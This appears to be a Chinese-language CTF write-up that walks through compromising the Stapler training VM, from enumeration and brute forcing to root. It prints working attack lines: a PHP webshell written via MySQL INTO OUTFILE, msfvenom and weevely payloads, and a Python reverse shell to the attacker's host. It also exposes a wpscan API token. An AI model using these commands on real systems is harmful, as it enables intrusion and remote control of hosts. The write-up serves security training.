## 简介

该项目是g0tmi1k作者精心制作的项目环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该文章都能学习到一些红队的技巧和知识。

该项目有始有终会用到信息收集->各类服务端口信息枚举->wordpress
advanced漏洞利用->Mysql信息枚举+暴力破解->Getshell->Mysql攻陷服务器->内网信息枚举->提权-三种方法，最终拿到flag.txt的过程，那么在八大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 一、信息收集

信息收集非常重要，有了信息才能知道下一步该如何进行，接下来将用nmap来演示信息收集：

### 1、nmap扫描存活IP

由于本项目环境是nat模式需要项目IP地址，扫描挖掘本地的IP地址信息：  
![1650113686_625abc9670197938846c7.png!small?1650113687378](https://image.3001.net/images/20220416/1650113686_625abc9670197938846c7.png!small?1650113687378)  
发现本kali ip为40段！用40段进行全网段扫描：

    
    
    nmap -sP 192.168.40.0/24
    

![1650113691_625abc9b5339d8c7299bc.png!small?1650113691560](https://image.3001.net/images/20220416/1650113691_625abc9b5339d8c7299bc.png!small?1650113691560)

发现项目IP为152！

### 2、nmap全端口服务枚举

进行namp全端口服务枚举：

    
    
    nmap -sS -sV -A -T5 -p- 192.168.40.152
    

![1650113696_625abca02acc5bd756d2e.png!small?1650113698114](https://image.3001.net/images/20220416/1650113696_625abca02acc5bd756d2e.png!small?1650113698114)  
![1650113700_625abca4a27b7ed42c7a0.png!small?1650113701084](https://image.3001.net/images/20220416/1650113700_625abca4a27b7ed42c7a0.png!small?1650113701084)

得到开放的端口信息：

    
    
    21/tcp    open   ftp         vsftpd 2.0.8 or later  
    ftp-anon: Anonymous FTP login allowed (FTP code 230)
    22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    53/tcp    open   domain      dnsmasq 2.75
    80/tcp    open   http        PHP cli server 5.5 or later123/tcp   closed ntp
    139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
    666/tcp   open   doom? message2.jpgUT 
    3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
    12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
    

以及smb2（windows445端口，共享用）利用！  
可以看到有很多容易受到攻击的端口都开着，FTP、NetBIOS、MySQL和运行Web服务器（Apache HTTPD）的端口12380等等！

## 二、各类服务端口信息枚举

### 1、FTP信息枚举

根据nmap全端口服务枚举的提示，ftp允许匿名登录：

    
    
    21/tcp    open   ftp         vsftpd 2.0.8 or later  
    ftp-anon: Anonymous FTP login allowed (FTP code 230)
    

1）ftp匿名登录枚举

![1650113707_625abcab15612e81f3956.png!small?1650113707330](https://image.3001.net/images/20220416/1650113707_625abcab15612e81f3956.png!small?1650113707330)

    
    
    ftp 192.168.40.152
    get note     ---下载note文件
    

未授权登录成功，查到note文件，并下载查看！

2）查看note文件

通过ftp下载该文件进行查看：  
![1650113711_625abcaf99bafcb172c03.png!small?1650113711834](https://image.3001.net/images/20220416/1650113711_625abcaf99bafcb172c03.png!small?1650113711834)

    
    
    Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
    

里面是txt文本信息：说将账号信息留存在FTP中，那么还有别的账号密码！  
获得两个用户名：Elly、John，其他无可用信息！

### 2、Samba信息收集

这是139的Samba服务，可以用smbclient来查看。

smbclient是一个开放的netbios-ssn，用smbclient来查看（属于samba套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源）！用Enum4linux枚举，这是一个用于枚举来自Windows和Samba系统的信息的工具。

1）Enum4linux枚举

    
    
    enum4linux -a 192.168.40.152
    -a   做所有参数选项枚举一遍
    

![1650113717_625abcb5578477a23736a.png!small?1650113718469](https://image.3001.net/images/20220416/1650113717_625abcb5578477a23736a.png!small?1650113718469)![1650113721_625abcb96bc4524764638.png!small?1650113722687](https://image.3001.net/images/20220416/1650113721_625abcb96bc4524764638.png!small?1650113722687)

**获取到2个可用信息：**  
 **1\. ok活跃信息：**

    
    
    //192.168.40.152/kathy	Mapping: OK, Listing: OK
    //192.168.40.152/tmp	Mapping: OK, Listing: OK
    

kathy和tmp两个信息非常活跃！可以用smbclient连接！

 **2\. 发现了20个用户信息**  
![1650113727_625abcbf89f15bd48a44f.png!small?1650113728929](https://image.3001.net/images/20220416/1650113727_625abcbf89f15bd48a44f.png!small?1650113728929)  
kathy和tmp两个信息非常活跃！可以用smbclient连接！

 **2）保存用户信息，并筛查**

    
    
    gedit user.txt
    cat user.txt | cut -d '\' -f2 | cut -d ' ' -f1 > user.txt
    

![1650113732_625abcc4b58b58ee06dcb.png!small](https://image.3001.net/images/20220416/1650113732_625abcc4b58b58ee06dcb.png!small)  
将通过筛选剔除后，获得正常的用户名：user.txt！

### 3、暴力破解ssh信息枚举

 **1）hydra暴力破解**

nmap扫描ssh端口为开放状态，利用hydra爆破

    
    
    hydra -L user.txt -P user.txt 192.168.40.152 ssh
    

![1650113739_625abccbc4beb4adfc8ed.png!small?1650113740097](https://image.3001.net/images/20220416/1650113739_625abccbc4beb4adfc8ed.png!small?1650113740097)

    
    
    login: SHayslett   password: SHayslett
    

获得ssh登录账号密码！

 **2）ssh登录**

ssh尝试登录：

    
    
    ssh SHayslett@192.168.40.152 
    

![1650113744_625abcd07224a3c70cb89.png!small?1650113744690](https://image.3001.net/images/20220416/1650113744_625abcd07224a3c70cb89.png!small?1650113744690)  
登录成功！到了这一步有非常多的提权方法，咱们继续分析该项目环境！

### 4、nc信息枚举666端口

 **1）访问http端口**

通过浏览器访问该端口：

    
    
    http://192.168.40.152:666/
    

![1650113749_625abcd5e0acc46dc4b20.png!small?1650113750635](https://image.3001.net/images/20220416/1650113749_625abcd5e0acc46dc4b20.png!small?1650113750635)  
发现这是一个文件！

 **2）nc下载文件**

通过nc访问该端口进行探测：

    
    
    nc 192.168.40.152 666 >test   #将文件下载为test     
    file test                     #查看test版本
    unzip -h                      #看下zip版本信息
    unzip test                    #用zip解压test文件
    

![1650113754_625abcda50e546fc41ce1.png!small?1650113755547](https://image.3001.net/images/20220416/1650113754_625abcda50e546fc41ce1.png!small?1650113755547)  
通过nc下载压缩文件，并解压获得message2的jpg图片！

 **3）Strings查看图片信息**

strings查看该图片隐藏信息：

    
    
    strings message2.jpg
    

![1650113759_625abcdf2c790ecb3fba0.png!small?1650113759847](https://image.3001.net/images/20220416/1650113759_625abcdf2c790ecb3fba0.png!small?1650113759847)  
给了两个cookie值，先留着该信息！

### 5、枚举12380端口信息收集

 **1）访问端口**

用浏览器访问该页面：

    
    
    http://192.168.40.152:12380/
    

![1650113764_625abce4a2ad9761d048a.png!small?1650113765786](https://image.3001.net/images/20220416/1650113764_625abce4a2ad9761d048a.png!small?1650113765786)  
发现该页面没有可利用的信息，进行漏扫看看！

 **2）Nikto扫描URL**

nikto 是一款开放源代码的、功能强大的 WEB 扫描评估软件，能对 web
服务器多种安全项目进行测试的扫描软件，去寻找已知有名的漏洞，能在230多种服务器上扫描出2600多种有潜在危险的文件、CGI
及其他问题，它可以扫描指定主机的 WEB 类型、主机名、特定目录、COOKIE、特定 CGI 漏洞、返回主机允许的 http 模式等等。

    
    
    nikto -h http://192.168.40.152:12380/
    

![1650113769_625abce94b4cd547ad460.png!small?1650113771417](https://image.3001.net/images/20220416/1650113769_625abce94b4cd547ad460.png!small?1650113771417)

发现三个目录/admin112233/、/blogblog/、/phpmyadmin/，发现提示SSL
Info，说明是ssl访问的，可以https访问，尝试访问http访问会重定向回来，需要HTTPS访问URL！

 **3）ssl访问**

先枚举访问/admin112233目录：

    
    
    https://192.168.40.152:12380/admin112233/
    

![1650113773_625abced9e40a0d460f63.png!small?1650113773863](https://image.3001.net/images/20220416/1650113773_625abced9e40a0d460f63.png!small?1650113773863)  
回显： **This could of been a BeEF-XSS hook ;)** ，存在XSS！

 **枚举访问/blogblog目录：**

    
    
    https://192.168.40.152:12380/blogblog/
    

![1650113778_625abcf246ead4d9dc20e.png!small?1650113778586](https://image.3001.net/images/20220416/1650113778_625abcf246ead4d9dc20e.png!small?1650113778586)  
发现该网站的是用WordPress搭建的，版本是 **4.2.1**

枚举访问/phpmyadmin目录：

    
    
    https://192.168.40.152:12380/phpmyadmin
    

![1650113783_625abcf70b9fd8fbd215b.png!small?1650113783294](https://image.3001.net/images/20220416/1650113783_625abcf70b9fd8fbd215b.png!small?1650113783294)

得到phpmyadmin的后台登录界面，需要账户密码！

### 6、Wpscan信息收集

从blogblog目录可以发现该站存在wordpress站！可利用wpscan进行枚举扫描！

 **1）wpscan扫描blogblog网页**

    
    
    wpscan --url https://192.168.40.152:12380/blogblog/ --disable-tls-checks
    
    --disable-tls-checks  ---因为会受到SSL对等证书/SSH错误临时用法！
    

![1650113788_625abcfc39de640446d50.png!small?1650113789133](https://image.3001.net/images/20220416/1650113788_625abcfc39de640446d50.png!small?1650113789133)  
![1650113791_625abcffd8b5fc33a610d.png!small?1650113792409](https://image.3001.net/images/20220416/1650113791_625abcffd8b5fc33a610d.png!small?1650113792409)

提示我们登录https://wpscan.com/register获取wpscan API令牌，才能输出漏洞数据

 **2）获取wpscan API令牌**

需要访问官网，获取密匙：

    
    
    https://wpscan.com/register
    

![1650113795_625abd039248399fcf94d.png!small?1650113795799](https://image.3001.net/images/20220416/1650113795_625abd039248399fcf94d.png!small?1650113795799)  
在官网登录后主页面存在API Token复制即可！

 **3）wpscan扫描**

通过获取的token直接开始扫描：

    
    
    wpscan --url https://192.168.40.152:12380/blogblog/  -e u --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc --disable-tls-checks
    

![1650113799_625abd074ff3f676367bc.png!small?1650113802964](https://image.3001.net/images/20220416/1650113799_625abd074ff3f676367bc.png!small?1650113802964)![1650113803_625abd0bc71d46574d039.png!small?1650113809308](https://image.3001.net/images/20220416/1650113803_625abd0bc71d46574d039.png!small?1650113809308)  
扫描发现该目录：blogblog/wp-content/，访问下收集信息！还存在很多漏洞CVE信息，如感兴趣可深入研究！

 **4）访问发现有3个子目录**

在blogblog/wp-content/plugins/发现：  
![1650113807_625abd0fbac8448805c59.png!small?1650113809309](https://image.3001.net/images/20220416/1650113807_625abd0fbac8448805c59.png!small?1650113809309)  
发现存在advanced_video_embed.php，提示存在wordpress advanced video插件模块信息！

## 三、wordpress advanced漏洞利用

### 1、39646 exp利用

谷歌搜索：

    
    
    wordpress advanced video exploit
    

![1650113812_625abd143cc66ef87d951.png!small?1650113812995](https://image.3001.net/images/20220416/1650113812_625abd143cc66ef87d951.png!small?1650113812995)  
可以利用39646，在kali上查找并利用！

### 2、查找并利用py脚本

kali渗透系统自带很多exp脚本，直接查找即可！

    
    
    cp /usr/share/exploitdb/exploits/php/webapps/39646.py .
    

![1650113817_625abd190cda0104b81d5.png!small?1650113817441](https://image.3001.net/images/20220416/1650113817_625abd190cda0104b81d5.png!small?1650113817441)  
将exp复制到利用目录！

### 3、修改exp代码

添加修改以下内容：

    
    
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context
    url = "https://192.168.40.152:12380/blogblog/"
    

![1650113821_625abd1d2d48aa11db5ba.png!small?1650113823642](https://image.3001.net/images/20220416/1650113821_625abd1d2d48aa11db5ba.png!small?1650113823642)

**参考：**

    
    
    https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error
    

修改后执行即可！

### 4、访问URL文件上传页面：

通过修改exp代码，进行对项目环境渗透行为后，在upload目录会出现新的文件内容：

    
    
    https://192.168.40.152:12380/blogblog/wp-content/uploads
    

![1650113826_625abd226ba1a78d203ff.png!small?1650113826716](https://image.3001.net/images/20220416/1650113826_625abd226ba1a78d203ff.png!small?1650113826716)  
目录下会出现图片： **193104749.jpeg** ，下载：

    
    
    wget --no-check-certificate https://192.168.40.152:12380/blogblog/wp-content/uploads/193104749.jpeg
    --no-check-certificate  ---这个参数可促使wget下载ssl文件
    

![1650113830_625abd267762423518031.png!small?1650113830915](https://image.3001.net/images/20220416/1650113830_625abd267762423518031.png!small?1650113830915)  
下载后进行分析图片信息！

### 5、图片信息枚举

file查看图片类型：  
![1650113834_625abd2ad26aa0434883c.png!small?1650113835017](https://image.3001.net/images/20220416/1650113834_625abd2ad26aa0434883c.png!small?1650113835017)

    
    
    193104749.jpeg: PHP script, ASCII text
    

这是一个php代码的txt文本！直接查看！  
![1650113838_625abd2e04dcbaf2a6ac9.png!small?1650113838902](https://image.3001.net/images/20220416/1650113838_625abd2e04dcbaf2a6ac9.png!small?1650113838902)

    
    
    define('DB_USER', 'root');
    define('DB_PASSWORD', 'plbkac');
    

获得mysql用户名密码：

    
    
    root/plbkac
    

接下来使用账号密码直接枚举数据库！

## 四、Mysql信息枚举+暴力破解

### 1、库表信息枚举

利用图片枚举出的mysql数据库账号密码进行枚举：

    
    
    mysql -uroot -pplbkac -h 192.168.40.152   #利用获得的账户密码远程登录
    show databases;             #查看数据库信息
    use wordpress               #进入wordpress
    show tables;                #查看表信息
    

![1650113844_625abd34a142c9031ce1c.png!small?1650113845559](https://image.3001.net/images/20220416/1650113844_625abd34a142c9031ce1c.png!small?1650113845559)  
通过mysql命令枚举到数据库wordpress库中存在wp_users表信息！

### 2、表字段信息枚举

读取wp_user用户表数据：

    
    
    desc wp_users;
    select user_login,user_pass from wp_users;
    或者select * from wp_users;
    

![1650113850_625abd3a68f5f0cc9fde2.png!small?1650113851394](https://image.3001.net/images/20220416/1650113850_625abd3a68f5f0cc9fde2.png!small?1650113851394)  
通过select枚举出该表所有信息内容存在用户名和MD5加密的密码信息！将数据保存至本地：

    
    
    gedit 1.txt
    

![1650113854_625abd3e4b6eeb8c778c5.png!small?1650113855798](https://image.3001.net/images/20220416/1650113854_625abd3e4b6eeb8c778c5.png!small?1650113855798)

### 3、AWK分解保存

使用awk进行文本出来提取user_pass这个字段所有值，在保存至pass.txt  
awk拆分密码信息： **密码在第3部分**

    
    
    awk -F'|' '{print $3}' 1.txt > pass.txt
    

![1650113859_625abd433c7617328ada4.png!small?1650113859527](https://image.3001.net/images/20220416/1650113859_625abd433c7617328ada4.png!small?1650113859527)

参考文章：

    
    
    https://www.runoob.com/linux/linux-comm-awk.html
    

如果密码信息太大的话，需要一个个复制黏贴会很麻烦，学会直接进行awk读取会非常的方便！

### 4、john爆破密码本

继续使用John的rockyou文本对mysql密码信息进行爆破：

    
    
    john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
    

![1650113864_625abd4850b79240f02bf.png!small?1650113870562](https://image.3001.net/images/20220416/1650113864_625abd4850b79240f02bf.png!small?1650113870562)

    
    
    $P$B7889EMq/erHIuZapMB8GEizebcIy9.:incorrect
    

发现对应john用户，密码为 **incorrect**

## 五、Getshell

通过暴力破解数据库中的密码值，发现了账号密码信息可直接登录wordpress后台，登录后有很多方法可以getshell，接下来就简单介绍利用！

### 1、登录后台

访问后台页面，用账户：john，密码：incorrect

    
    
    https://192.168.40.152:12380/blogblog/wp-login.php
    

![1650113965_625abdad323f8219f8d2e.png!small?1650113965539](https://image.3001.net/images/20220416/1650113965_625abdad323f8219f8d2e.png!small?1650113965539)  
测试可成功登录！

### 2、文件上传

Plugins-》 add New -》upload Plugin ：存在上传文件  
![1650113969_625abdb154d37b7ab0ea3.png!small?1650113969863](https://image.3001.net/images/20220416/1650113969_625abdb154d37b7ab0ea3.png!small?1650113969863)

### 3、php-webshell利用

复制phpshell到本文件夹：

    
    
    cp /usr/share/webshells/php/php-reverse-shell.php .
    

![1650113973_625abdb5e097958e464de.png!small?1650113974379](https://image.3001.net/images/20220416/1650113973_625abdb5e097958e464de.png!small?1650113974379)

配置PHP文件，将IP更改为本地kail IP：  
![1650113978_625abdba46445a7ccc0be.png!small?1650113980218](https://image.3001.net/images/20220416/1650113978_625abdba46445a7ccc0be.png!small?1650113980218)  
修改完成即可上传文件！上传PHP文件：  
![1650113983_625abdbf73deb1967e798.png!small?1650113984148](https://image.3001.net/images/20220416/1650113983_625abdbf73deb1967e798.png!small?1650113984148)  
查看是否上传成功：  
![1650113987_625abdc341dc168c9a327.png!small?1650113987796](https://image.3001.net/images/20220416/1650113987_625abdc341dc168c9a327.png!small?1650113987796)  
上传成功！本地开启nc服务，并访问后门进行反弹shell：

    
    
    nc -vlp 1234
    https://192.168.40.152:12380/blogblog/wp-content/uploads/php-reverse-shell.php
    

![1650114003_625abdd302eb65d15a9c7.png!small?1650114004182](https://image.3001.net/images/20220416/1650114003_625abdd302eb65d15a9c7.png!small?1650114004182)  
成功获得反弹shell，并控制项目环境服务器！

### 4、weevely利用

 **1）利用weevely生成PHP木马文件**

Weevely是一个隐形的PHP网页的外壳，模拟的远程连接。

 **软件特点：**

生成和管理很难检测到的PHP木马，这是一个Web应用程序后开发的重要工具，可用于像一个隐藏的后门，作为一个有用的远程控制台更换管理网络帐户，即使托管在免费托管服务。只是生成并上传“服务器”目标Web服务器上的PHP代码，Weevely客户端在本地运行shell命令传输。

    
    
    weevely generate pass11 test.php   ---生成test.php文件密码为passtest
    generate  ---生成新代理
    

![1650114008_625abdd8b35a0bb833cdc.png!small?1650114009302](https://image.3001.net/images/20220416/1650114008_625abdd8b35a0bb833cdc.png!small?1650114009302)  
weevely的优势在于免杀性，可看到php木马信息是混淆过的特征！

 **2）上传文件**  
![1650114012_625abddc699d0e2d6018c.png!small?1650114013085](https://image.3001.net/images/20220416/1650114012_625abddc699d0e2d6018c.png!small?1650114013085)  
验证上传是否成功：  
![1650114018_625abde2297a6571770bb.png!small?1650114018522](https://image.3001.net/images/20220416/1650114018_625abde2297a6571770bb.png!small?1650114018522)  
成功上传！

 **3）运行该PHP文件，获得shell**

    
    
    weevely https://192.168.40.152:12380/blogblog/wp-content/uploads/test.php passtest
    

![1650114022_625abde680ae3e686d270.png!small?1650114023021](https://image.3001.net/images/20220416/1650114022_625abde680ae3e686d270.png!small?1650114023021)  
成功获得shell，该shell很稳定！

### 5、webacoo利用

WeBaCoo（Web Backdoor Cookie）是一款隐蔽的脚本类Web后门工具。
借助HTTP协议，它可在客户端和Web服务器之间实现执行代码的网页终端。 WeBaCoo的精妙之处在于，Web服务器和客户端之间的通信载体是Cookie。

 **1）webacoo生成PHP后门文件**

    
    
    webacoo -g -o webacoo.php
    -g 生成后门代码（需要-o）
    -o OUTPUT 生成的后门输出文件名
    

![1650114027_625abdebcfac65b064b0e.png!small?1650114028753](https://image.3001.net/images/20220416/1650114027_625abdebcfac65b064b0e.png!small?1650114028753)  
可看到webacoo也是通过特征混淆了php木马，但是没用weevely免杀性能好！

 **2）后台页面上传该PHP后门**  
![1650114032_625abdf01975a4f79cdf8.png!small?1650114032439](https://image.3001.net/images/20220416/1650114032_625abdf01975a4f79cdf8.png!small?1650114032439)

访问是否上传成功：  
![1650114036_625abdf43177159421914.png!small?1650114036639](https://image.3001.net/images/20220416/1650114036_625abdf43177159421914.png!small?1650114036639)  
成功上传！

 **3）远程连接执行PHP文件**

    
    
    webacoo -t -u https://192.168.40.152:12380/blogblog/wp-content/uploads/webacoo.php
    
    -t 建立远程“终端”连接（需要-u）
    -u URL 后门 URL 
    

![1650114041_625abdf932416422215b5.png!small?1650114041594](https://image.3001.net/images/20220416/1650114041_625abdf932416422215b5.png!small?1650114041594)  
成功获得shell，该shell很稳定！

### 6、Msfconsole上线webshell

Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration
testing）及入侵检测系统签名开发。

 **1）kali本地生成webshell**

    
    
    msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.40.149 LPORT=4455 -f raw > msf.php
    
    --LHOST 为kali本地IP
    --LPORT 为连接端口
    

![1650114047_625abdff037c7ed842df5.png!small?1650114047390](https://image.3001.net/images/20220416/1650114047_625abdff037c7ed842df5.png!small?1650114047390)  
生成成功msf.php木马文件！

 **2）后台上传PHP文件**  
![1650114050_625abe02df301dabb1fc8.png!small?1650114051467](https://image.3001.net/images/20220416/1650114050_625abe02df301dabb1fc8.png!small?1650114051467)  
上传成功：  
![1650114054_625abe0698482d58674c3.png!small?1650114055170](https://image.3001.net/images/20220416/1650114054_625abe0698482d58674c3.png!small?1650114055170)  
成功上传后需要msf开启监听！

 **3）msf开启监听**

开启msfconsole进入MSF框架：

    
    
    msfconsole
    use exploit/multi/handler
    set payload php/meterpreter_reverse_tcp
    set LHOST 192.168.40.149
    set LPORT 4455
    run
    

![1650114094_625abe2e5189a7d7e2620.png!small?1650114095004](https://image.3001.net/images/20220416/1650114094_625abe2e5189a7d7e2620.png!small?1650114095004)  
开启监听后，访问msf.php文件触发，可看到反弹shell成功！

## 六、Mysql攻陷服务器

### 1、mysql INTO OUT文件上传

MySQL中你可以使用SELECT...INTO OUTFILE语句来简单的导出数据到文本文件上。  
![1650114099_625abe33245ba967b8ba1.png!small?1650114099616](https://image.3001.net/images/20220416/1650114099_625abe33245ba967b8ba1.png!small?1650114099616)

1）INTO OUT 写入shell.php

    
    
    mysql -uroot -pplbkac -h 192.168.40.152
    select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
    

![1650114103_625abe3773014e3b09eae.png!small?1650114103914](https://image.3001.net/images/20220416/1650114103_625abe3773014e3b09eae.png!small?1650114103914)  
可看到利用INTO OUT特性写入了一句话并导入到本地站目录上！

 **2）查看是否写入成功**

    
    
    https://192.168.40.152:12380/blogblog/wp-content/uploads/
    

![1650114108_625abe3cdb4aa2c056e4c.png!small?1650114109390](https://image.3001.net/images/20220416/1650114108_625abe3cdb4aa2c056e4c.png!small?1650114109390)  
写入成功！

 **3）URL执行cmd命令**

    
    
    https://192.168.40.152:12380/blogblog/wp-content/uploads/shell.php?cmd=id
    

![1650114113_625abe41b842d9e3cab81.png!small?1650114114054](https://image.3001.net/images/20220416/1650114113_625abe41b842d9e3cab81.png!small?1650114114054)  
可看到一句话成功写入，利用一句话特性执行了命令获得服务器信息回显！

### 2、一句话触发反弹shell

 **1）查看是否可以用Python写入一句话**

    
    
    https://192.168.40.152:12380/blogblog/wp-content/uploads/shell.php?cmd=which%20python
    

![1650114118_625abe464fec5cb8e4b0b.png!small?1650114118764](https://image.3001.net/images/20220416/1650114118_625abe464fec5cb8e4b0b.png!small?1650114118764)  
存在python模块！直接利用！

 **2）开启nc监听**

    
    
    nc -lvp 8887
    

![1650114122_625abe4a4e7fdd5a52f63.png!small?1650114122554](https://image.3001.net/images/20220416/1650114122_625abe4a4e7fdd5a52f63.png!small?1650114122554)  
本地kali开启好监听！

 **3）在cmd URL写入Python一句话，反弹shell到本地kali**

    
    
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.40.149",8887));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    

![1650114126_625abe4ec73fc55ce53b7.png!small?1650114127579](https://image.3001.net/images/20220416/1650114126_625abe4ec73fc55ce53b7.png!small?1650114127579)  
反弹成功，获得shell

## 七、内网信息枚举

通过以上各种方法获取到服务器权限后，开启内部信息收集工作！将利用linpeas枚举脚本进行探测行为！

### 1、Linpeas文件上传

开启Python http服务，上传linpeas.sh脚本对靶机进行信息收集：

    
    
    python -m SimpleHTTPServer 8082
    wget http://192.168.40.149:8082/linpeas.sh
    

![1650114132_625abe547dff84e574f73.png!small?1650114132999](https://image.3001.net/images/20220416/1650114132_625abe547dff84e574f73.png!small?1650114132999)  
成功上传！

### 2、赋权并执行脚本

    
    
    chmod +x linpeas.sh
    /linpeas.sh
    

![1650114136_625abe58e3622eec12b9d.png!small?1650114137622](https://image.3001.net/images/20220416/1650114136_625abe58e3622eec12b9d.png!small?1650114137622)  
赋权后执行该脚本，开始查看收集到的信息，筛查提炼！

### 3、内部信息收集筛查

 **1）发现版本信息**  
![1650114141_625abe5d96a60cba89802.png!small?1650114142317](https://image.3001.net/images/20220416/1650114141_625abe5d96a60cba89802.png!small?1650114142317)  
可以尝试内核提权！

 **2）发现用户信息枚举**  
![1650114145_625abe61355349039dd99.png!small?1650114146208](https://image.3001.net/images/20220416/1650114145_625abe61355349039dd99.png!small?1650114146208)

    
    
    JKanode:x:1013:1013::/home/JKanode:/bin/bash
    peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
    uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
    

peter用户可利用sudo提权！

 **3）发现数据库信息泄露**  
![1650114149_625abe654cd350ff10928.png!small?1650114149582](https://image.3001.net/images/20220416/1650114149_625abe654cd350ff10928.png!small?1650114149582)  
之前已经查找到MySQL账户密码！内部也是能枚举到的！

 **4）发现可写入sh文件**  
![1650114153_625abe6958af48103f78c.png!small?1650114153683](https://image.3001.net/images/20220416/1650114153_625abe6958af48103f78c.png!small?1650114153683)  
可尝试写入sh文件，漏洞利用提权！

## 八、提权-三种方法

### 1、内核提权-方法1

 **1）kali搜索版本信息，是否存在漏洞**

查找版本漏洞：

    
    
    searchsploit Linux Kernel 4.4.x
    

![1650114157_625abe6de8204cbc57f2a.png!small?1650114159349](https://image.3001.net/images/20220416/1650114157_625abe6de8204cbc57f2a.png!small?1650114159349)  
可以利用linux/local/39772.txt！

 **2）39772利用**

下载到本目录：

    
    
    cp /usr/share/exploitdb/exploits/linux/local/39772.txt .
    

![1650114162_625abe72c0f6e61889e6d.png!small?1650114163164](https://image.3001.net/images/20220416/1650114162_625abe72c0f6e61889e6d.png!small?1650114163164)  
查看39772如何利用：

    
    
    cat 39772.txt
    

![1650114166_625abe76ee67389a49bb4.png!small?1650114167713](https://image.3001.net/images/20220416/1650114166_625abe76ee67389a49bb4.png!small?1650114167713)![1650114171_625abe7b333d46e6ed13e.png!small?1650114173244](https://image.3001.net/images/20220416/1650114171_625abe7b333d46e6ed13e.png!small?1650114173244)  
提示需到exploit-DB下载39772.zip文件！

 **3）wget下载39772.zip**

    
    
    proxychains wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
    

![1650114175_625abe7fd39645f78c7d9.png!small?1650114177225](https://image.3001.net/images/20220416/1650114175_625abe7fd39645f78c7d9.png!small?1650114177225)  
成功下载！如果不行挂代理下载！

 **4）开启http服务，上传到项目**

    
    
    python -m SimpleHTTPServer 8085
    wget http://10.211.55.19:8085/39772.zip
    

![1650114179_625abe83d1cfa5059c89d.png!small?1650114180396](https://image.3001.net/images/20220416/1650114179_625abe83d1cfa5059c89d.png!small?1650114180396)  
利用wget连接本地的http服务成功上传文件！

 **5）解压并枚举**

    
    
    unzip 39772.zip    解压39772.zip文件
    cd 39772             到39772目录下
    tar xvf exploit.tar    解压exploit.tar，发现ebpf_mapfd_doubleput_exploit目录
    cd ebpf_mapfd_doubleput_exploit   到该目录下，发现compile.sh文件
    chmod +x compile.sh     给sh文件赋权
    

![1650114184_625abe888b2f59261174e.png!small?1650114185325](https://image.3001.net/images/20220416/1650114184_625abe888b2f59261174e.png!small?1650114185325)  
通过zip解压后开始利用！

 **6）执行文件提权**

    
    
    ./compile.sh    执行sh文件
    ls              查看，发现是由gcc编译的.c文件
    ./doubleput     执行.c文件
    

![1650114189_625abe8daad166abd43e0.png!small?1650114191266](https://image.3001.net/images/20220416/1650114189_625abe8daad166abd43e0.png!small?1650114191266)  
成功拿到root权限！

### 2、SSH-sudo登录内核提权-方法2

利用ssh信息收集技巧查看信息！

 **1）枚举ssh信息**

grep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep
指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。

    
    
    grep -rn "ssh"   ---枚举当前目录下存在ssh信息的内容
    

![1650114194_625abe92e364ff28e812b.png!small?1650114197717](https://image.3001.net/images/20220416/1650114194_625abe92e364ff28e812b.png!small?1650114197717)

    
    
    JKanode/.bash_history:6:sshpass -p thisimypassword ssh JKanode@localhost
    JKanode/.bash_history:8:sshpass -p JZQuyIN5 peter@localhost
    

发现2个用户密码：

    
    
    用户1：peter，密码：JZQuyIN5
    用户2：JKanode  密码：thisimypassword
    

这时候利用账号密码尝试登录！

 **2）ssh登录用户**

JKanode用户登录枚举：

    
    
    ssh JKanode@192.168.40.152
    thisimypassword
    

![1650114201_625abe994d3ce466d69d0.png!small?1650114202019](https://image.3001.net/images/20220416/1650114201_625abe994d3ce466d69d0.png!small?1650114202019)  
没什么信息！

peter用户登录枚举：

    
    
    ssh peter@192.168.40.152
    JZQuyIN5
    

![1650114206_625abe9ec61eb3757330b.png!small?1650114208881](https://image.3001.net/images/20220416/1650114206_625abe9ec61eb3757330b.png!small?1650114208881)  
登录进去发现这是zsh的shell！，并且可以sudo提权！

 **3）sudo提权**

用户信息枚举就发现peter用户存在sudo提权漏洞，查看sudo给与的权限：  
![1650114211_625abea3e332f6e61536a.png!small?1650114212565](https://image.3001.net/images/20220416/1650114211_625abea3e332f6e61536a.png!small?1650114212565)

    
    
    sudo -l
    User peter may run the following commands on red:
        (ALL : ALL) ALL
    

可看到给与的权限为ALL最高权限！直接sudo提权：

    
    
    sudo su 
    

![1650114216_625abea8098f56df3de97.png!small?1650114216870](https://image.3001.net/images/20220416/1650114216_625abea8098f56df3de97.png!small?1650114216870)  
成功提权root！

